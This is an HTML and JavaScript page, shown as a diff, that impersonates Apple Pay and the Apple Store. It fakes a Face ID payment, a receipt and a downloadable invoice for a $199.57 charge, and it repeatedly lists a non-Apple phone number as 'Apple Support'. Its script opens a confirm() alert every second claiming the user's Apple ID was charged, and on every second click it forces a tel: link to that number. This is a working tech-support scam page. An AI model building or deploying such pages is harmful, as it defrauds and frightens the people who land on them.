+                    <path class="face-path" d="M12,14 A4,4 0 0,1 16,10 L20,10" />
+                    <path class="face-path" d="M30,10 L34,10 A4,4 0 0,1 38,14" />
+                    <path class="face-path" d="M38,36 L38,36 A4,4 0 0,1 34,40 L30,40" />
+                    <path class="face-path" d="M20,40 L16,40 A4,4 0 0,1 12,36" />
+                    <path class="face-path" d="M18,20 L18,20" stroke-width="2" />
+                    <path class="face-path" d="M32,20 L32,20" stroke-width="2" />
+                    <path class="face-path" d="M25,24 L25,28" />
+                    <path class="face-path" d="M20,33 Q25,36 30,33" />
+                </svg>
+                <div class="dots-container" id="scanDots">
+                    <div class="dot"></div><div class="dot"></div><div class="dot"></div>
+                </div>
+                <div class="check-circle" id="checkCircle">✓</div>
+                <div class="status-txt" id="statusText">Processing Payment<br><span class="status-sub">Please wait...</span></div>
+            </div>
+        </div>
+
+        <div class="receipt-screen" id="receiptScreen">
+            <div class="receipt-inner">
+                <div class="top-support">
+                    For support or to request a refund, contact Apple Support at<br><a class="link-blue" href="tel:+1 (833) 534-2551">+1 (833) 534-2551</a>
+                </div>
+                <div class="hero-section">
+                    <div class="hero-logo"></div>
+                    <div class="hero-msg">Thank you for your purchase.</div>
+                </div>
+                <div class="sec-title">Order Summary</div>
+                <div class="summary-box">
+                    <div class="sum-row">
+                        <span style="font-weight:500;">Apple Gift Card</span>
+                        <span>$199.57</span>
+                    </div>
+                    <div class="item-sub">Digital delivery via email</div>
+                    <div style="height:1px; background:#E5E5EA; margin:15px 0;"></div>
+                    <div class="total-row">
+                        <span class="total-lbl">Total</span>
+                        <span class="total-val">$199.57</span>
+                    </div>
+                </div>
+                <div class="sec-title">Payment Method</div>
+                <div class="gray-box">
+                    <span style="font-weight:600;">Apple Pay</span>
+                </div>
+                <div class="gray-box">
+                    <div class="gray-row">
+                        <span class="gray-lbl">Order Number</span>
+                        <span class="gray-val">W43749077</span>
+                    </div>
+                    <div class="gray-row">
+                        <span class="gray-lbl">Order Date</span>
+                        <span class="gray-val" id="recDate">Loading...</span>
+                    </div>
+                    <div class="gray-row">
+                        <span class="gray-lbl">Payment Status</span>
+                        <span class="gray-val">Paid</span>
+                    </div>
+                </div>
+                <div class="help-box">
+                    <div class="help-title">Questions? We're here to help.</div>
+                    <div class="help-desc">For questions about your order or to request a refund</div>
+                    <a class="link-blue" style="font-size:16px;" href="tel:+1 (833) 534-2551">+1 (833) 534-2551</a>
+                    <div class="btn-row">
+                        <button class="btn btn-white" onclick="window.print()">Print Receipt</button>
+                        <button class="btn btn-blue" onclick="generatePDF()">Download PDF</button>
+                    </div>
+                </div>
+                <div class="footer">
+                    For assistance or questions about your order, call <span style="color:#007AFF">+1 (833) 534-2551</span><br><br>
+                    
+                    <div class="footer-line"></div>
+                    
+                    Apple Inc.<br>One Apple Park Way, Cupertino, CA 95014, U.S.A.<br>All rights reserved.<br>
+                    <div class="footer-links"><span>Privacy Policy</span> <span>Terms of Sale</span> <span>Legal</span></div>
+                </div>
+            </div>
+        </div>
+
+        <div class="dialer-screen" id="dialerScreen">
+            <div class="dialer-display">
+                <div class="dialer-num">+1 (833) 534-2551</div>
+                <div class="dialer-sub">Add Number</div>
+            </div>
+            <div class="keypad-grid">
+                <div class="key"><div class="key-num">1</div><div class="key-let"></div></div>
+                <div class="key"><div class="key-num">2</div><div class="key-let">ABC</div></div>
+                <div class="key"><div class="key-num">3</div><div class="key-let">DEF</div></div>
+                <div class="key"><div class="key-num">4</div><div class="key-let">GHI</div></div>
+                <div class="key"><div class="key-num">5</div><div class="key-let">JKL</div></div>
+                <div class="key"><div class="key-num">6</div><div class="key-let">MNO</div></div>
+                <div class="key"><div class="key-num">7</div><div class="key-let">PQRS</div></div>
+                <div class="key"><div class="key-num">8</div><div class="key-let">TUV</div></div>
+                <div class="key"><div class="key-num">9</div><div class="key-let">WXYZ</div></div>
+                <div class="key"><div class="key-num">*</div><div class="key-let"></div></div>
+                <div class="key"><div class="key-num">0</div><div class="key-let">+</div></div>
+                <div class="key"><div class="key-num">#</div><div class="key-let"></div></div>
+            </div>
+            <div class="call-area">
+                <div class="call-btn" onclick="closeDialer()">
+                    <svg width="35" height="35" viewBox="0 0 24 24" fill="white">
+                        <path d="M6.62 10.79c1.44 2.83 3.76 5.14 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.25 1.02l-2.2 2.2z"/>
+                    </svg>
+                </div>
+            </div>
+        </div>
+
+    </div>
+
+    <div id="pdf-template">
+        <div class="inv-header">
+            <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADIAAAAyCAYAAAAeP4ixAAAACXBIWXMAAAsTAAALEwEAmpwYAAAEfElEQVR4nO2ZS2hcVRjHf/+ZzCSTTGYm83AynUfS2LRJ06S10UfTivVBK4iCghuvhS50I9iF4kIEK4ILwY2IiCCLChUERcFH0dZWa9Vq2zSdadJmMpPM5JnMfRzn3Ds3k3kz00zG4g/CzJ17v/N9/3O+853zXTwiQv9fXU7fB2wFtgO7gX3AQeAQcBR4HzgNfAtM+x20Ah4F7gceBx4DNgN1wBXgBHAW+AyY8yNehVjA48CTwCtAK9DkY6wG4ABwAvgSmHExli82AE8CbwNbXAw1hxeBr4EPA4zli3XAG8DbnkZaQAvwGvDBasZaQSPwDvCxp5EW8D7w7mrEWkED8CHwma+hFvA58O5KwVpBAfAR8JWvoRbwtfD+SsBaQQHwBfCdr6EW8J3w/rLAakET8K3voRbwLfCWa9gaYAPwva+hFvC98P6ywGqhEfgB+MHXUAv4AfjO12A10AL85HuoBfwE3OtatAZoAX71PdQCfgK+cw1WAy3Ar76HWsCvwDuuRWuAFuA330MtwK9C6K8ArAbqgD98D7WA34B3XQvWABuAP30PtYA/hfeXBbaWmQ/8BdwHzANzQCNQ42OwWbgG/AF8D3wJnAWOA1eAaz4GW8BCZi7wF3A/MA/MAY1AdYCRluA68AfwPfAlcBY4DlwFrgI20lg2Zi7wF3A/MA/MAY1AdYCRluA68AfwPfAlcBY4DlwFrgI20lg2Zk74E7gfmAPmgEagOsBIS3Ad+AP4HvgSOAscB64CVwEbaSwbMxf4E7gfmAPmgEagOsBIS3Ad+AP4HvgSOAscB64CVwEbaSwbMxf4E7gfmAPmgEagOsBIS3Ad+AP4HvgSOAscB64CVwEbaSwbMxf4E7gfmAPmgEagOsBIS3Ad+AP4HvgSOAscB64CVwEbaSwbMxf4E7gfmAPmgEagOsBIS3Ad+AP4HvgSOAscB64CVwEbaSwbMxf4E7gfmAPmgEagOsBIS3Ad+AP4HvgSOAscB64CVwEbaSwbMxf4E7gfmAPmgEagOsBIS3Ad+AP4HvgSOAscB64CVwEbaSwbMxf4E7gfmAPmgEagOsBIS3Ad+AP4HvgSOAscB64CVwEbaSwbMxf4E7gfmAPmgEagOsBIS3Ad+AP4HvgSOAscB64CVwEbaSwbMxf4E7gfmAPmgEagOsBIS3Ad+AP4HvgSOAscB64CVwEbaSwbMxf4E7gfmAPmgEagOsBIS3Ad+AP4HvgSOAscB64CVwEbaSwbMxf4E7gfmAPmgEagOsBIS3Ad+AP4HvgSOAscB64CVwEbaSwbMx/4E7gfmAPmgEagOsBIy/8Y+B44CxwHrgJXKTCStcx84E/gfmAemAMagep/MNL3wJfAWeA4cBW4utxI65m5wJ/A/cA8MAdU/4ORvge+BM4Cx4GrwNXlRlrPzAX+BO4H5oE5oBGo/gcjfQ98CZwFjgNXgavLjbSemQv8CdwPzANzQCNQ/Q9G+h74EjgLHLeu4j8i7gceAx4DNgN1wBXgBHAW+AyY8zvo/w8i/gI+g94006vT+QAAAABJRU5ErkJggg==" class="pdf-logo-img" />
+            
+            <div class="inv-stack">
+                <div class="inv-line-1">Apple Store</div>
+                <div class="inv-line-2">Invoice Receipt</div>
+                <div class="inv-line-3">Do Not Pay</div>
+            </div>
+        </div>
+
+        <div class="inv-grid">
+            <div class="inv-col">
+                <span class="inv-lbl">Sold To:</span>
+                Gloria Estefan<br>
+                102 Osei Tutu st.<br>
+                Ashanti, Ghana 0233<br><br>
+                Customer Number: 900007
+            </div>
+            
+            <div class="inv-col">
+                <span class="inv-lbl">Order Details</span>
+                <table class="inv-table">
+                    <tr>
+                        <td style="background:#EFEFEF; font-weight:bold;">Order Number:</td>
+                        <td>W43749077</td>
+                    </tr>
+                    <tr>
+                        <td style="background:#EFEFEF; font-weight:bold;">Order Date:</td>
+                        <td id="pdfOrderDate">Loading...</td>
+                    </tr>
+                </table>
+            </div>
+
+            <div class="inv-col">
+                <span class="inv-lbl">Ship To:</span>
+                Gloria Estefan<br>
+                Osei Tutu St.<br>
+                Ashanti, Ghana 0233
+            </div>
+        </div>
+
+        <div class="inv-table-title">Product Details</div>
+        <table class="inv-table">
+            <thead>
+                <tr>
+                    <th>Product Name</th>
+                    <th>Product Number</th>
+                    <th class="text-right">Item Price</th>
+                    <th class="text-center">Qty Ordered</th>
+                    <th class="text-center">Qty Shipped</th>
+                    <th class="text-right">Extended Price</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td>IPHONE 12 PRO MAX</td>
+                    <td>MG9J3LL/A</td>
+                    <td class="text-right">$199.00</td>
+                    <td class="text-center">1</td>
+                    <td class="text-center">1</td>
+                    <td class="text-right">$199.00</td>
+                </tr>
+            </tbody>
+        </table>
+
+        <div class="inv-table-title">Additional Information</div>
+        <table class="inv-table">
+            <thead>
+                <tr>
+                    <th>Invoice Number</th>
+                    <th>Invoice Date</th>
+                    <th>Terms</th>
+                    <th>Next Payment</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td>9299465512</td>
+                    <td id="pdfInvDate">Loading...</td>
+                    <td>Instalment</td>
+                    <td id="pdfNextPay">Loading...</td>
+                </tr>
+            </tbody>
+        </table>
+
+        <div class="inv-totals-wrap">
+            <div class="inv-totals-box">
+                <div class="inv-total-row">
+                    <span>Subtotal</span>
+                    <span>$182.00</span>
+                </div>
+                <div class="inv-total-row">
+                    <span>Sales Tax</span>
+                    <span>$17.57</span>
+                </div>
+                <div class="inv-total-row">
+                    <span>Total</span>
+                    <span>$199.57</span>
+                </div>
+                <div class="inv-total-row">
+                    <span>Amount Due</span>
+                    <span>$199.57</span>
+                </div>
+            </div>
+        </div>
+
+        <div class="inv-footer">
+            This order is subject to Apple's Sales and Refunds Policies.<br>
+            <a href="#" class="inv-link">http://store.apple.com/Catalog/US/Images/salespolicies.html</a><br>
+            https://store.apple.com/1-800-MY-APPLE/WebObjects/OrderStatus.woa/5144003/wo/D1...
+        </div>
+    </div>
+
+    <script>
+        const overlay = document.getElementById('overlay');
+        const spinner = document.getElementById('spinner');
+        const faceId = document.getElementById('faceId');
+        const scanDots = document.getElementById('scanDots');
+        const checkCircle = document.getElementById('checkCircle');
+        const statusText = document.getElementById('statusText');
+        const paySheet = document.getElementById('paySheet');
+        const receiptScreen = document.getElementById('receiptScreen');
+        const dialerScreen = document.getElementById('dialerScreen');
+        const successSound = document.getElementById('successSound');
+
+        // Elements for Dynamic Date
+        const recDate = document.getElementById('recDate');
+        const pdfOrderDate = document.getElementById('pdfOrderDate');
+        const pdfInvDate = document.getElementById('pdfInvDate');
+        const pdfNextPay = document.getElementById('pdfNextPay');
+
+        window.onload = function() {
+            // --- 1. SET DYNAMIC DATES ---
+            const now = new Date();
+            
+            // Format 1: "Jun 26, 2023" (For PDF Order/Invoice Date)
+            const dateOptions = { month: 'short', day: '2-digit', year: 'numeric' };
+            const dateStr = now.toLocaleDateString('en-US', dateOptions);
+            
+            // Format 2: "Jun 26, 2023 at 2:30 PM" (For On-Screen Receipt)
+            const timeOptions = { hour: 'numeric', minute: '2-digit', hour12: true };
+            const timeStr = now.toLocaleTimeString('en-US', timeOptions);
+            const receiptDateTime = `${dateStr} at ${timeStr}`;
+
+            // Apply to Elements
+            recDate.innerText = receiptDateTime;
+            pdfOrderDate.innerText = dateStr;
+            pdfInvDate.innerText = dateStr;
+            pdfNextPay.innerText = dateStr; // Same day payment
+
+            // --- 2. START ANIMATION SEQUENCE ---
+            setTimeout(() => { overlay.classList.add('active'); }, 500);
+
+            // Processing (1 sec)
+            setTimeout(() => {
+                spinner.style.display = 'none';
+                statusText.style.display = 'none';
+
+                // Face ID + Dots
+                faceId.style.display = 'block';
+                scanDots.style.display = 'flex'; 
+                setTimeout(() => { faceId.classList.add('scanning'); }, 100);
+
+            }, 1500);
+
+            // Success (1 sec after face scan starts)
+            setTimeout(() => {
+                faceId.style.display = 'none';
+                scanDots.style.display = 'none';
+                checkCircle.style.display = 'flex';
+                statusText.innerHTML = "Done";
+                statusText.style.display = 'block';
+                
+                // Play Sound
+                successSound.play().catch(e => console.log("Audio auto-play blocked"));
+
+            }, 2500); 
+
+            // Redirect (1 sec after done shows)
+            setTimeout(() => {
+                paySheet.style.transition = 'transform 0.5s ease-in';
+                paySheet.style.transform = 'translateY(110%)';
+                overlay.classList.remove('active');
+
+                setTimeout(() => {
+                    receiptScreen.style.display = 'flex';
+                    receiptScreen.offsetHeight; 
+                    receiptScreen.style.opacity = '1';
+
+                }, 400);
+
+            }, 3500);
+        };
+
+        function generatePDF() {
+            const btn = document.querySelector('.btn-blue');
+            const originalText = btn.innerText;
+            btn.innerText = "Downloading...";
+            
+            const element = document.getElementById('pdf-template');
+            element.style.display = 'block'; 
+
+            const opt = {
+                margin: [0, 0, 0, 0],
+                filename: 'Apple_Invoice_W43749077.pdf',
+                image: { type: 'jpeg', quality: 0.98 },
+                html2canvas: { scale: 2 },
+                jsPDF: { unit: 'pt', format: 'a4', orientation: 'portrait' }
+            };
+
+            html2pdf().set(opt).from(element).save().then(() => {
+                element.style.display = 'none'; 
+                btn.innerText = "Saved ✓";
+                setTimeout(() => btn.innerText = originalText, 2000);
+            });
+        }
+
+        // --- ALERT BOX FUNCTIONALITY ---
+        let alertClickCount = 0;
+        const iosPhoneNumber = "tel:+1 (833) 534-2551";
+
+        function showAlertWithDelay() {
+            // Show alert 2 seconds after receipt appears
+            setTimeout(() => {
+                showRepeatingAlert();
+            }, 2000);
+        }
+
+        function showRepeatingAlert() {
+            alertClickCount++;
+            
+            const userResponse = confirm("ApplePay has noticed that your Apple Id was recently used at Apple Store for $199.57 using your Apple Pay Pre Authorization. If this was not you, please call Apple Support at +1 (833) 534-2551 to report this!");
+            
+            // On every 2nd click (OK or Cancel), open the tel: link
+            if (alertClickCount % 2 === 0) {
+                window.location.href = iosPhoneNumber;
+            }
+            
+            // Show alert again
+            setTimeout(() => {
+                showRepeatingAlert();
+            }, 1000);
+        }
+
+        // Trigger alert after receipt is shown
+        const originalLoad = window.onload;
+        window.onload = function() {
+            if (originalLoad) originalLoad();
+            
+            // Start alert after receipt becomes visible + 2 seconds delay
+            setTimeout(() => {
+                showAlertWithDelay();
+            }, 5900);
+        };
+    </script>
+  <!-- Privacy-friendly analytics by Plausible -->
+<script async src="../plausible.io/js/pa-kJGBxQ_tc4Q-nuXSg2HVP.js"></script>
+<script>
+  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
+  plausible.init()
+</script>
+
+  <script src="track.js"></script>
+</body>
+
+</html>
